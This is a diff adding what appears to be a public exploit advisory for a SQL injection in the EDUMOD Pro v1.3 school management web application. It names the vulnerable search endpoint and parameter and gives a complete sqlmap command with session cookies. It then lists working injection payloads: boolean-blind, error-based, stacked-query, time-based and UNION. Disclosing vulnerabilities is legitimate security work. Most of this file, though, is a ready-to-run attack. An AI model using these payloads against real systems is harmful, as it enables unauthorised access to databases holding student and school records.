@@ -1,0 +1,44 @@
+Exploit Title: School Management System | EDUMOD Pro v1.3 – SQL Injection
+Date: 02.08.2017
+Vendor Homepage: https://codecanyon.net/item/school-management-system-edumod-pro/19764430?s_rank=288
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+EDUMOD Pro is an advanced school management software based on web. It is developed with core PHP and mysql. You can manage all your school with a simple and understandable user interface. All modules available in software is under a start menu you can click to menu and go anywhere accross modules. There are various modules available for you and for your school in EDUMOD.
+
+Vulnerable Url: http://localhost/students/search.php (POST Method)
+
+Sqlmap Example : sqlmap -u "http://localhost/students/search.php" --cookie="_gat=1; _omappvp=true; _omappvs=true; _ga=GA1.2.810440502.1501701941; _gid=GA1.2.661879708.1501701941; PHPSESSID=i7gcjsi41rbm48ejn2a1ddgfti" 
+--data="Query=Test&action=Search"
+
+---
+Parameter: Query (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: Query=Test%' AND 5466=5466 AND '%'='&action=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY cl
+ause (FLOOR)
+    Payload: Query=Test%' AND (SELECT 7257 FROM(SELECT COUNT(*),CONCAT(0x717a7a7
+671,(SELECT (ELT(7257=7257,1))),0x7171767871,FLOOR(RAND(0)*2))x FROM INFORMATION
+_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='&action=Search
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: Query=Test%';SELECT SLEEP(5)#&action=Search
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: Query=Test%' AND SLEEP(5) AND '%'='&action=Search
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: Query=Test%' UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7671,0x4d715
+07376585366416c53467453544e687853795747574a627351635357467676616366706e6355,0x71
+71767871),NULL,NULL-- SXjD&action=Search
+---
